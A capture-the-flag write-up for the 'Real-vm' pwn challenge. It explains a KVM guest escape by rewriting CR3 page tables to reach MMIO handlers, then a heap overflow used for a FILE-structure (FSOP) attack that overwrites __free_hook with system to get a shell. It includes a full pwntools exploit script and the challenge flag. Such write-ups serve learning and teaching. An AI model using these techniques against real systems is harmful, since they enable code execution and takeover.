# Real-vm

* The program only has `1` main function like this

```cpp=
int __fastcall main(int argc, const char **argv, const char **envp)
{
  __u32 exit_reason; // eax
  __u64 phys_addr; // rax
  unsigned int code_len; // [rsp+4h] [rbp-42FCh] BYREF
  int kvm; // [rsp+8h] [rbp-42F8h]
  int vm; // [rsp+Ch] [rbp-42F4h]
  int vcpu; // [rsp+10h] [rbp-42F0h]
  unsigned int vcpu_mmap_size; // [rsp+14h] [rbp-42ECh]
  _QWORD *usercode; // [rsp+18h] [rbp-42E8h]
  void *v12; // [rsp+20h] [rbp-42E0h]
  kvm_run *addr; // [rsp+28h] [rbp-42D8h]
  __int64 v14; // [rsp+30h] [rbp-42D0h]
  __int64 v15; // [rsp+38h] [rbp-42C8h]
  __int64 v16; // [rsp+40h] [rbp-42C0h]
  kvm_userspace_memory_region v17; // [rsp+50h] [rbp-42B0h] BYREF
  kvm_userspace_memory_region v18; // [rsp+70h] [rbp-4290h] BYREF
  kvm_regs regs; // [rsp+90h] [rbp-4270h] BYREF
  kvm_regs n; // [rsp+120h] [rbp-41E0h] BYREF
  kvm_sregs sregs; // [rsp+1B0h] [rbp-4150h] BYREF
  char user_code[16392]; // [rsp+2F0h] [rbp-4010h] BYREF
  unsigned __int64 v23; // [rsp+42F8h] [rbp-8h]

  v23 = __readfsqword(0x28u);
  code_len = 0;
  memset(user_code, 0, 0x4000uLL);
  ignore();
  printf("Here is your Golden Bullet Comrade : %p\n", stdin);
  puts("Give me the  Code Length");
  __isoc99_scanf("%u", &code_len);
  if ( code_len > 0x3FFF )
  {
    printf("Sorry Comrade the code is too big !");
    exit(-1);
  }
  puts("Give me Your Code Comrade");
  read(0, user_code, code_len);
  kvm = open("/dev/kvm", 524290);
  if ( kvm == -1 )
  {
    puts("kvmfd error");
    exit(1);
  }
  vm = ioctl(kvm, 0xAE01uLL, 0LL);              //  KVM_CREATE_VM
  if ( vm == -1 )
    exit(-1);
  usercode = mmap(0LL, 0x10000uLL, 7, 34, -1, 0LL);
  if ( usercode == (_QWORD *)-1LL )
  {
    printf("mmap(1) err");
    exit(2);
  }
  v17.slot = 0;
  v17.flags = 0;
  v17.guest_phys_addr = 0LL;
  v17.memory_size = 0x10000LL;
  v17.userspace_addr = (__u64)usercode;
  v12 = mmap(0LL, 0x2000uLL, 3, 34, -1, 0LL);
  if ( v12 == (void *)-1LL )
    exit(-1);
  v18.slot = 1;
  v18.flags = 2;
  v18.guest_phys_addr = 90112LL;
  v18.memory_size = 0x2000LL;
  v18.userspace_addr = (__u64)v12;
  if ( ioctl(vm, 0x4020AE46uLL, &v17) == -1 )   // KVM_SET_USER_MEMORY_REGION
    exit(-1);
  if ( ioctl(vm, 0x4020AE46uLL, &v18) == -1 )   // KVM_SET_USER_MEMORY_REGION
    exit(-1);
  usercode[0xC00] = 0x7003LL;                   // setting pagetables
  usercode[0xE00] = 0x8003LL;
  usercode[0x1000] = 0x9003LL;
  usercode[0x1200] = 3LL;
  usercode[4609] = 0x1003LL;
  usercode[4610] = 0x2003LL;
  usercode[4611] = 0x3003LL;
  usercode[4612] = 0x4003LL;
  usercode[4613] = 0x5003LL;
  vcpu = ioctl(vm, 0xAE41uLL, 0LL);             //  KVM_CREATE_VCPU
  if ( vcpu == -1 )
    exit(-1);
  vcpu_mmap_size = ioctl(kvm, 0xAE04uLL, 0LL);  // KVM_GET_VCPU_MMAP_SIZE
  if ( vcpu_mmap_size == -1 )
    exit(-1);
  if ( vcpu_mmap_size <= 0x92F )
    exit(-1);
  addr = (kvm_run *)mmap(0LL, (int)vcpu_mmap_size, 3, 1, vcpu, 0LL);
  if ( !addr )
    exit(-1);
  if ( ioctl(vcpu, 0x8090AE81uLL, &regs) == -1 )// KVM_GET_REGS
    exit(-1);
  regs.rip = 0LL;
  regs.rflags = 2LL;
  if ( ioctl(vcpu, 0x4090AE82uLL, &regs) == -1 )// KVM_SET_REGS
    exit(-1);
  if ( ioctl(vcpu, 0x8138AE83uLL, &sregs) == -1 )// KVM_GET_SREGS
    exit(-1);
  sregs.cr0 = 2147811379LL;
  sregs.cr4 = 32LL;
  sregs.efer = 1281LL;
  sregs.cr3 = 24576LL;
  if ( ioctl(vcpu, 0x4138AE84uLL, &sregs) == -1 )// KVM_SET_SREGS
    exit(-1);
  if ( ioctl(vcpu, 0x8138AE83uLL, &sregs) < 0 ) // KVM_GET_SREGS
    exit(-1);
  v14 = 0LL;
  v15 = 0x1030010FFFFFFFFLL;
  v16 = 0x101010000LL;
  sregs.cs.base = 0LL;
  *(_QWORD *)&sregs.cs.limit = 0x10B0008FFFFFFFFLL;
  *(_QWORD *)&sregs.cs.dpl = 0x101010000LL;
  sregs.ss.base = 0LL;
  *(_QWORD *)&sregs.ss.limit = 0x1030010FFFFFFFFLL;
  *(_QWORD *)&sregs.ss.dpl = 0x101010000LL;
  sregs.gs.base = 0LL;
  *(_QWORD *)&sregs.gs.limit = 0x1030010FFFFFFFFLL;
  *(_QWORD *)&sregs.gs.dpl = 0x101010000LL;
  sregs.fs.base = 0LL;
  *(_QWORD *)&sregs.fs.limit = 0x1030010FFFFFFFFLL;
  *(_QWORD *)&sregs.fs.dpl = 0x101010000LL;
  sregs.es.base = 0LL;
  *(_QWORD *)&sregs.es.limit = 0x1030010FFFFFFFFLL;
  *(_QWORD *)&sregs.es.dpl = 0x101010000LL;
  sregs.ds.base = 0LL;
  *(_QWORD *)&sregs.ds.limit = 0x1030010FFFFFFFFLL;
  *(_QWORD *)&sregs.ds.dpl = 0x101010000LL;
  if ( ioctl(vcpu, 0x4138AE84uLL, &sregs) < 0 ) // KVM_SET_SREGS
    exit(-1);
  printf("\x1B[0;91m[+] Let The VM RIP !!!!!\n\x1B[0m");
  memcpy(usercode, user_code, 0x4000uLL);
  while ( 1 )
  {
    if ( ioctl(vcpu, 0xAE80uLL, 0LL) == -1 )    // KVM_RUN
    {
      puts("KVM_RUN");
      exit(3);
    }
    exit_reason = addr->exit_reason;
    if ( exit_reason == 5 )
      break;
    if ( exit_reason != 6 )                     // KVM_EXIT_MMIO
    {
      printf("\nreason : %llx \n", addr->exit_reason);
      printf("GGs Comrade !");
      exit(0);
    }
    phys_addr = addr->mmio.phys_addr;
    if ( phys_addr == 90120 )
    {
      if ( !entry )
      {
        puts("[+] Creating Debug Entry");
        entry = malloc(0x20uLL);
      }
    }
    else if ( phys_addr > 0x16008 )
    {
      if ( phys_addr == 90128 )
      {
        if ( entry )
        {
          if ( ioctl(vcpu, 0x8090AE81uLL, &n) == -1 )// KVM_GET_REGS
            exit(-1);
          puts("[+] Reached Debug Command Center");
          memcpy(entry, (char *)usercode + HIDWORD(n.rax), LODWORD(n.rax));
          printf("[+] Debug Command Read ");
        }
      }
      else
      {
        if ( phys_addr == 90136 )
        {
          fclose(file);
          free(file_buf);
          munmap(addr, (int)vcpu_mmap_size);
          munmap(v12, 0x2000uLL);
          exit(0);
        }
LABEL_60:
        printf("%llx", addr->mmio.phys_addr);
        printf("You Screwed Up Comrade !");
      }
    }
    else
    {
      if ( phys_addr != 0x16000 )
        goto LABEL_60;
      if ( !file )
      {
        file = fopen("log.txt", "r");
        if ( !file )
          exit(-1);
      }
      puts("[+] Setting Up Log File");
    }
  }
  puts("KVM_EXIT_HLT");
  return 0;
}
```

* Here the program uses the kvm module to perform virtualization. To interact with the module, the program uses a series of ioctl calls. To better understand how to use and the parameters, I went online to read some examples of how to use kvm like [here](https://github.com/dpw/kvm-hello-world/blob/master/kvm-hello-world.c)
* We can use command `strace -v ./real-vm` to better view the arguments for `ioctl`

![Screenshot 2024-05-26 150043](https://hackmd.io/_uploads/rJrHnDeEC.png)

* Pretty the same as the link above
* In these codes

```cpp=
v17.slot = 0;
  v17.flags = 0;
  v17.guest_phys_addr = 0LL;
  v17.memory_size = 0x10000LL;
  v17.userspace_addr = (__u64)usercode;
  v12 = mmap(0LL, 0x2000uLL, 3, 34, -1, 0LL);
  if ( v12 == (void *)-1LL )
    exit(-1);
  v18.slot = 1;
  v18.flags = 2;
  v18.guest_phys_addr = 90112LL;
  v18.memory_size = 0x2000LL;
  v18.userspace_addr = (__u64)v12;
  if ( ioctl(vm, 0x4020AE46uLL, &v17) == -1 )   // KVM_SET_USER_MEMORY_REGION
    exit(-1);
  if ( ioctl(vm, 0x4020AE46uLL, &v18) == -1 )   // KVM_SET_USER_MEMORY_REGION
```

* It sets up `2` physical memory regions in our vm. First from `0->0x10000` and `0x16000-0x18000`. Both is mapped with a userspace address
* Next it sets up `RIP` in virtual machine

```cpp=
if ( ioctl(vcpu, 0x8090AE81uLL, &regs) == -1 )// KVM_GET_REGS
    exit(-1);
  regs.rip = 0LL;
  regs.rflags = 2LL;
  if ( ioctl(vcpu, 0x4090AE82uLL, &regs) == -1 )// KVM_SET_REGS
    exit(-1);
```
* `rip` is set to `0`, which is where our code starts. Notice that the address of  `rip` is a virtual address, and section `0->0x10000`is physical memory. So to map virtual address `0` to physical address `0` the machine use [pagetables](https://docs.kernel.org/mm/page_tables.html)
* Basically it will use serveral tables to map from virtual address to a physical address. The process is called pagewalk. The virtual address is actually index into these tables and these tables contain physical address

![pagetables_with_bits-1](https://hackmd.io/_uploads/HJCLAPxNC.jpg)

* The first table address(`PGD`) is stored at `CR3`
* Here we can see that `CR3` is set to `0x6000`

```
ioctl(5, KVM_SET_SREGS, {cs={base=0, limit=4294967295, selector=8, type=11, present=1, dpl=0, db=0, s=1, l=1, g=1, avl=0}, ds={base=0, limit=4294967295, selector=16, type=3, present=1, dpl=0, db=0, s=1, l=1, g=1, avl=0}, es={base=0, limit=4294967295, selector=16, type=3, present=1, dpl=0, db=0, s=1, l=1, g=1, avl=0}, fs={base=0, limit=4294967295, selector=16, type=3, present=1, dpl=0, db=0, s=1, l=1, g=1, avl=0}, gs={base=0, limit=4294967295, selector=16, type=3, present=1, dpl=0, db=0, s=1, l=1, g=1, avl=0}, ss={base=0, limit=4294967295, selector=16, type=3, present=1, dpl=0, db=0, s=1, l=1, g=1, avl=0}, tr={base=0, limit=65535, selector=0, type=11, present=1, dpl=0, db=0, s=0, l=0, g=0, avl=0}, ldt={base=0, limit=65535, selector=0, type=2, present=1, dpl=0, db=0, s=0, l=0, g=0, avl=0}, gdt={base=0, limit=65535}, idt={base=0, limit=65535}, cr0=2147811379, cr2=0, cr3=24576, cr4=32, cr8=0, efer=1281, apic_base=0xfee00900, interrupt_bitmap=[0, 0, 0, 0]}) = 0

```
* And here is how it sets up pagetables

```cpp=
usercode[0xC00] = 0x7003LL;                   // setting pagetables
usercode[0xE00] = 0x8003LL;
usercode[0x1000] = 0x9003LL;
usercode[0x1200] = 3LL;
usercode[4609] = 0x1003LL;
usercode[4610] = 0x2003LL;
usercode[4611] = 0x3003LL;
usercode[4612] = 0x4003LL;
usercode[4613] = 0x5003LL;
```

* In index `0x1200` is the `PTE` so that virtual address from `0->0x5fff` will be mapped exactly `0->0x5fff` in physically memory
* The loop handle the stop of vm

```cpp=
while ( 1 )
  {
    if ( ioctl(vcpu, 0xAE80uLL, 0LL) == -1 )    // KVM_RUN
    {
      puts("KVM_RUN");
      exit(3);
    }
    v3 = *((_DWORD *)addr + 2);
    if ( v3 == 5 )
      break;
    if ( v3 != 6 )                              // KVM_EXIT_MMIO
    {
      printf("\nreason : %llx \n", *((unsigned int *)addr + 2));
      printf("GGs Comrade !");
      exit(0);
    }
    v5 = *((_QWORD *)addr + 4);
    if ( v5 == 90120 )
    {
      if ( !entry )
      {
        puts("[+] Creating Debug Entry");
        entry = malloc(0x20uLL);
      }
    }
    else if ( v5 > 0x16008 )
    {
      if ( v5 == 90128 )
      {
        if ( entry )
        {
          if ( ioctl(vcpu, 0x8090AE81uLL, n) == -1 )// KVM_GET_REGS
            exit(-1);
          puts("[+] Reached Debug Command Center");
          memcpy(entry, (char *)usercode + HIDWORD(n[0]), LODWORD(n[0]));
          printf("[+] Debug Command Read ");
        }
      }
      else
      {
        if ( v5 == 90136 )
        {
          fclose(file);
          free(file_buf);
          munmap(addr, (int)vcpu_mmap_size);
          munmap(v12, 0x2000uLL);
          exit(0);
        }
LABEL_60:
        printf("%llx", *((_QWORD *)addr + 4));
        printf("You Screwed Up Comrade !");
      }
    }
    else
    {
      if ( v5 != 90112 )
        goto LABEL_60;
      if ( !file )
      {
        file = fopen("log.txt", "r");
        if ( !file )
          exit(-1);
      }
      puts("[+] Setting Up Log File");
    }
  }
```

* So to use these option we need to trigger `KVM_EXIT_MMIO`. As i understand, we need to access some section of physical memory to trigger that. I tried accessing`0->0x10000` but it didn't work. And the section `0x16000` is out of the range
* After a few search i found [this](https://github.com/kscieslinski/CTF/tree/master/pwn/conf2020/kvm). So i figured out that i can change `CR3` to reach any address i want
* So i need to setup the pagetables first

```
mov qword ptr [0x1000], 0x2003
mov qword ptr [0x2000], 0x3003
mov qword ptr [0x3000], 0x4003
mov qword ptr [0x4000], 0x0003  # set to original base to rip continue
mov qword ptr [0x4008], 0x16003
```
* Remember to keep virtual address `0` map to `0` physical address so that our `RIP` can continue. Here in first `12` bits of entry, there're flags, but i don't know much about them tho
* And after access to `0x1000`(which is `0x16000` in physical address) i triggered the mmio. Depend on which offset to trigger the code

```cpp=
if ( v5 == 90128 )
{
    if ( entry )
    {
    if ( ioctl(vcpu, 0x8090AE81uLL, n) == -1 )// KVM_GET_REGS
            exit(-1);
        puts("[+] Reached Debug Command Center");
        memcpy(entry, (char *)usercode + HIDWORD(n[0]), LODWORD(n[0]));
        printf("[+] Debug Command Read ");
        }
```
* We can clearly see that we can trigger overflow with `0x16010`
* With address `0x16000` the program opens a file using `fopen`, then it will create `1` struct `FILE` in heap. Since there's overflow, i can overwrite `FILE` srtuct ->`FSOP`. 
* `fclose` funciton

```cpp=
int
_IO_new_fclose (FILE *fp)
{
  int status;

  CHECK_FILE(fp, EOF); // check flag must be 0xfbad0000

#if SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)
  /* We desperately try to help programs which are using streams in a
     strange way and mix old and new functions.  Detect old streams
     here.  */
  if (_IO_vtable_offset (fp) != 0)
    return _IO_old_fclose (fp);
#endif

  /* First unlink the stream.  */
  if (fp->_flags & _IO_IS_FILEBUF) //#define _IO_IS_FILEBUF        0x2000
    _IO_un_link ((struct _IO_FILE_plus *) fp);

  _IO_acquire_lock (fp);
  if (fp->_flags & _IO_IS_FILEBUF) //#define _IO_IS_FILEBUF        0x2000
    status = _IO_file_close_it (fp);
  else
    status = fp->_flags & _IO_ERR_SEEN ? -1 : 0;
  _IO_release_lock (fp);
  _IO_FINISH (fp);
  if (fp->_mode > 0)
    {
      /* This stream has a wide orientation.  This means we have to free
	 the conversion functions.  */
      struct _IO_codecvt *cc = fp->_codecvt;

      __libc_lock_lock (__gconv_lock);
      __gconv_release_step (cc->__cd_in.step);
      __gconv_release_step (cc->__cd_out.step);
      __libc_lock_unlock (__gconv_lock);
    }
  else
    {
      if (_IO_have_backup (fp))
	_IO_free_backup_area (fp);
    }
  _IO_deallocate_file (fp);
  return status;
}
```

* Here i set flag `_IO_IS_FILEBUF` to trigger `status = _IO_file_close_it (fp);`

```cpp=
int
_IO_new_file_close_it (FILE *fp)
{
  int write_status;
  if (!_IO_file_is_open (fp))
    return EOF;

  if ((fp->_flags & _IO_NO_WRITES) == 0 // #define _IO_NO_WRITES         0x0008 /* Writing not allowed.  */
      && (fp->_flags & _IO_CURRENTLY_PUTTING) != 0) //#define _IO_CURRENTLY_PUTTING 0x0800
    write_status = _IO_do_flush (fp);
  else
    write_status = 0;

  _IO_unsave_markers (fp);

  int close_status = ((fp->_flags2 & _IO_FLAGS2_NOCLOSE) == 0
		      ? _IO_SYSCLOSE (fp) : 0);

  /* Free buffer. */
  if (fp->_mode > 0)
    {
      if (_IO_have_wbackup (fp))
	_IO_free_wbackup_area (fp);
      _IO_wsetb (fp, NULL, NULL, 0);
      _IO_wsetg (fp, NULL, NULL, NULL);
      _IO_wsetp (fp, NULL, NULL);
    }
  _IO_setb (fp, NULL, NULL, 0);
  _IO_setg (fp, NULL, NULL, NULL);
  _IO_setp (fp, NULL, NULL);

  _IO_un_link ((struct _IO_FILE_plus *) fp);
  fp->_flags = _IO_MAGIC|CLOSED_FILEBUF_FLAGS;
  fp->_fileno = -1;
  fp->_offset = _IO_pos_BAD;

  return close_status ? close_status : write_status;
}
libc_hidden_ver (_IO_new_file_close_it, _IO_file_close_it)
```

* Here i set flag `_IO_CURRENTLY_PUTTING` to trigger `write_status = _IO_do_flush (fp);` 

```cpp=
#define _IO_do_flush(_f) \
  ((_f)->_mode <= 0							      \
   ? _IO_do_write(_f, (_f)->_IO_write_base,				      \
		  (_f)->_IO_write_ptr-(_f)->_IO_write_base)		      \
   : _IO_wdo_write(_f, (_f)->_wide_data->_IO_write_base,		      \
		   ((_f)->_wide_data->_IO_write_ptr			      \
		    - (_f)->_wide_data->_IO_write_base)))
```

* Since `_f->_mode` less than `0` so it will call `_IO_do_write`. I can controll all `_IO_write_base`, `_IO_write_ptr`

```cpp=
int
_IO_new_do_write (FILE *fp, const char *data, size_t to_do)
{
  return (to_do == 0
	  || (size_t) new_do_write (fp, data, to_do) == to_do) ? 0 : EOF;
}
libc_hidden_ver (_IO_new_do_write, _IO_do_write)

static size_t
new_do_write (FILE *fp, const char *data, size_t to_do)
{
  size_t count;
  if (fp->_flags & _IO_IS_APPENDING) // #define _IO_IS_APPENDING      0x1000
    /* On a system without a proper O_APPEND implementation,
       you would need to sys_seek(0, SEEK_END) here, but is
       not needed nor desirable for Unix- or Posix-like systems.
       Instead, just indicate that offset (before and after) is
       unpredictable. */
    fp->_offset = _IO_pos_BAD;
  else if (fp->_IO_read_end != fp->_IO_write_base)
    {
      off64_t new_pos
	= _IO_SYSSEEK (fp, fp->_IO_write_base - fp->_IO_read_end, 1);
      if (new_pos == _IO_pos_BAD)
	return 0;
      fp->_offset = new_pos;
    }
  count = _IO_SYSWRITE (fp, data, to_do);
  if (fp->_cur_column && count)
    fp->_cur_column = _IO_adjust_column (fp->_cur_column - 1, data, count) + 1;
  _IO_setg (fp, fp->_IO_buf_base, fp->_IO_buf_base, fp->_IO_buf_base);
  fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_buf_base;
  fp->_IO_write_end = (fp->_mode <= 0
		       && (fp->_flags & (_IO_LINE_BUF | _IO_UNBUFFERED))
		       ? fp->_IO_buf_base : fp->_IO_buf_end);
  return count;
}
```

* I set flag `_IO_IS_APPENDING` to bypass `SYSEEK`
* The code `_IO_SYSWRITE (fp, data, to_do)` is a call to `_IO_write_t` in `fp->vtable`

```cpp=
struct _IO_jump_t
{
    JUMP_FIELD(size_t, __dummy);
    JUMP_FIELD(size_t, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow);
    JUMP_FIELD(_IO_underflow_t, __underflow);
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    /* showmany */
    JUMP_FIELD(_IO_xsputn_t, __xsputn);
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
    JUMP_FIELD(_IO_seekoff_t, __seekoff);
    JUMP_FIELD(_IO_seekpos_t, __seekpos);
    JUMP_FIELD(_IO_setbuf_t, __setbuf);
    JUMP_FIELD(_IO_sync_t, __sync);
    JUMP_FIELD(_IO_doallocate_t, __doallocate);
    JUMP_FIELD(_IO_read_t, __read);
    JUMP_FIELD(_IO_write_t, __write);
    JUMP_FIELD(_IO_seek_t, __seek);
    JUMP_FIELD(_IO_close_t, __close);
    JUMP_FIELD(_IO_stat_t, __stat);
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    JUMP_FIELD(_IO_imbue_t, __imbue);
};
```

* I change the `vtable` so that it calls `_IO_read_t` instead of `_IO_write_t ` and set `fp->fd` to `0`(stdin). So i have arbitrary write
* After the read, back to `_IO_new_file_close_it`

```cpp=
_IO_unsave_markers (fp);

  int close_status = ((fp->_flags2 & _IO_FLAGS2_NOCLOSE) == 0
		      ? _IO_SYSCLOSE (fp) : 0);

  /* Free buffer. */
  if (fp->_mode > 0)
    {
      if (_IO_have_wbackup (fp))
	_IO_free_wbackup_area (fp);
      _IO_wsetb (fp, NULL, NULL, 0);
      _IO_wsetg (fp, NULL, NULL, NULL);
      _IO_wsetp (fp, NULL, NULL);
    }
  _IO_setb (fp, NULL, NULL, 0);
  _IO_setg (fp, NULL, NULL, NULL);
  _IO_setp (fp, NULL, NULL);

  _IO_un_link ((struct _IO_FILE_plus *) fp);
  fp->_flags = _IO_MAGIC|CLOSED_FILEBUF_FLAGS;
  fp->_fileno = -1;
  fp->_offset = _IO_pos_BAD;

  return close_status ? close_status : write_status;
```
* `_IO_setb`

```cpp=
void
_IO_setb (FILE *f, char *b, char *eb, int a)
{
  if (f->_IO_buf_base && !(f->_flags & _IO_USER_BUF))
    free (f->_IO_buf_base);
  f->_IO_buf_base = b;
  f->_IO_buf_end = eb;
  if (a)
    f->_flags &= ~_IO_USER_BUF;
  else
    f->_flags |= _IO_USER_BUF;
}
libc_hidden_def (_IO_setb)
```
* We see that it calls `free(f->_IO_buf_base)`. So i just need to write `system` to `__free_hook` and `f->_IO_buf_base` to `/bin/sh`.
* The fake `FILE`
```py=
TARGET = libc.address + 0x3c3750 
overwrite = TARGET - 0x78 # change io_do_write
BUF = 0x3c4120 + libc.address
file = p64(0xfbad0000 | 0x800 | 0x2000 | 0x1000 | 0x8000) + p64(0)*3 + p64(libc.symbols['__free_hook']) + p64(libc.symbols['__free_hook'] + 8) + p64(libc.symbols['environ'] + 8)
file += p64(next(libc.search(b'/bin/sh\x00'))) + p64(0)*6 + p64(0) + p64(0)*2 + p64(BUF) + p64(0xffffffffffffffff) + p64(0)*5 + p64(0x0) + p64(0)*2 + p64(overwrite)
```
* Done

![Screenshot 2024-05-26 155033](https://hackmd.io/_uploads/rJygd_xVA.png)

* Script

```py=
#!/usr/bin/python3
from pwn import *

sla = lambda delim, data: p.sendlineafter(delim, data)
sa = lambda delim, data: p.sendafter(delim, data)
s = lambda data: p.send(data)
sl = lambda data: p.sendline(data)
r = lambda nbytes: p.recv(nbytes)
ru = lambda data: p.recvuntil(data)
rl = lambda : p.recvline()


elf = context.binary = ELF('real-vm')
libc = ELF('libc-2.23.so')

def int_from_bytes(bytes):
    return int.from_bytes(bytes, byteorder='little')


def GDB(proc):
    gdb.attach(p, gdbscript='''
               b *(main + 1948)
               c
               del
               b fclose
               c
               b _IO_file_close_it
               c
               b _IO_setb
               c
               ''')
#L3AK{KVM_4ND_F50P_1N_0N3_CH4113N63_7H15_MU57_B3_4_Dr34M}
p = process()
GDB(p)
ru(b'Comrade : ')
leak = rl()[:-1]
leak = int(leak.decode(), 16)
libc.address = leak - 0x3c48e0
print('leak: ', hex(leak))
print('libc: ', hex(libc.address))
shellcode = shellcraft.write(1, "hihihih", 0x100)
'''
mov qword ptr [0x1000], 0x2003
mov qword ptr [0x2000], 0x3003
mov qword ptr [0x3000], 0x4003
mov qword ptr [0x4000], 0x0003  # set to original base to rip continue
mov qword ptr [0x4008], 0x16003

mov rax, 0x1000
mov cr3, rax
mov rax, 0xdeadbeef
mov qword ptr [0x1000], 0xdead # open file
mov qword ptr [0x1008], 0xdead
mov qword ptr [0x1008], 0xdead

hlt'''

shellcode = '''
mov qword ptr [0x1000], 0x2003
mov qword ptr [0x2000], 0x3003
mov qword ptr [0x3000], 0x4003
mov qword ptr [0x4000], 0x0003
mov qword ptr [0x4008], 0x16003

mov rax, 0x1000
mov cr3, rax
mov rax, 0
mov qword ptr [0x1008], 0xdead
mov qword ptr [0x1010], 0xdead
mov qword ptr [0x1000], 0xdead
mov rax, 0x100000000110
mov qword ptr [0x1010], 0xdead
mov qword ptr [0x1018], 0xdead

hlt'''
TARGET = libc.address + 0x3c3750 
overwrite = TARGET - 0x78 # change io_do_write
BUF = 0x3c4120 + libc.address
file = p64(0xfbad0000 | 0x800 | 0x2000 | 0x1000 | 0x8000) + p64(0)*3 + p64(libc.symbols['__free_hook']) + p64(libc.symbols['__free_hook'] + 8) + p64(libc.symbols['environ'] + 8)
file += p64(next(libc.search(b'/bin/sh\x00'))) + p64(0)*6 + p64(0) + p64(0)*2 + p64(BUF) + p64(0xffffffffffffffff) + p64(0)*5 + p64(0x0) + p64(0)*2 + p64(overwrite)
payload = bytes(asm(shellcode))
payload = payload.ljust(0x1000, b'\x90')
payload += b'A'*0x20 + p64(0) + p64(0x231) + file
sla(b'Length', str(len(payload)).encode())
sa(b'Comrade', payload)

p.wait(0.5)
s(p64(libc.symbols['system']))
p.interactive()
```
